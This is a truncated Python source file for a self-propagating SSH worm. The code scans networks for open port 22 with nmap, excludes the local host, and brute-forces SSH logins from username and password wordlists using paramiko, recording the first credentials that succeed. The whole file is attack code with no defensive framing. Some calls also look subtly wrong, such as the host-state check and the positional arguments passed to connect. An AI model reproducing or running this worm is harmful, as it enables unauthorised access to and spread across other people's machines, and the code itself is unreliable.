import paramiko
import nmap
import socket
import os

class SSHConnection:
    """ Creates an SSHConnection class. """
    def __init__(self):
        """ Initializer. Possibly add exception handling later, or just trust user """
        self.password = None
        self.username = None
        self.vulnerable_hosts = []
        self.target_host = None
        self.worm_file = __file__
        self.ssh_connection = paramiko.SSHClient()
        self.ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def set_password(self, password):
        self.password = password

    def set_username(self, username):
        self.username = username

    def set_hosts(self, new_hosts):
        self.vulnerable_hosts = new_hosts

    def set_target(self, host):
        self.target_host = host

    def set_marker_file(self, file_name):
        self.worm_file = file_name

    def get_local_ip(self):
        """ Gets current machine's ip """
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(('8.8.8.8', 1))
        local_ip = sock.getsockname()[0]
        sock.close()
        return local_ip

    def retrieve_vulnerable_hosts(self):
        """ Retrieve list of hosts to attack, removes local computer """
        port_scanner = nmap.PortScanner()
        port_scanner.scan(self.vulnerable_hosts, arguments="-p 22 --open")
        host_info = port_scanner.allhosts()
        live_hosts = []
        for host in host_info:
            if port_scanner[host] == "up":
                live_hosts.append(host)
        local_host = self.get_local_ip()

        """ Remove local host from list of target IPs """
        try:
            live_hosts.remove(local_host)
        except ValueError:
            pass
        self.vulnerable_hosts = live_hosts

    def get_usernames_and_passwords(self, username_file, password_file):
        """ Returns list of strings for usernames and passwords files """
        with open(username_file, 'r') as unames:
            usernames = unames.readlines()
        with open(password_file, 'r') as passwds:
            passwords = passwds.readlines()
        usernames = [username.strip() for username in usernames]
        passwords = [password.strip() for password in passwords]
        return (usernames, passwords)

    def brute_force_host(self, target_host, usernames, passwords):
        """ Brute forces all a host. Returns true on success """
        for username in usernames:
            for password in passwords:
                try:
                    self.ssh_connection.connect(target_host, username, password)
                    self.set_target(target_host)
                    self.set_username(username)
                    self.set_password(password)
                    return True
                except paramiko.AuthenticationException as e:
                    continue
        return False

    def connect_to_host(self, username_file, password_file):
        usernames, passwords = self.get_usernames_and_passwords(username_file, password_file)
        for host in self.vulnerable_hosts:
            found_host = self.brute_force_host(host, usernames, passwords)
            if found_host:
                return
            else:
                continue

    def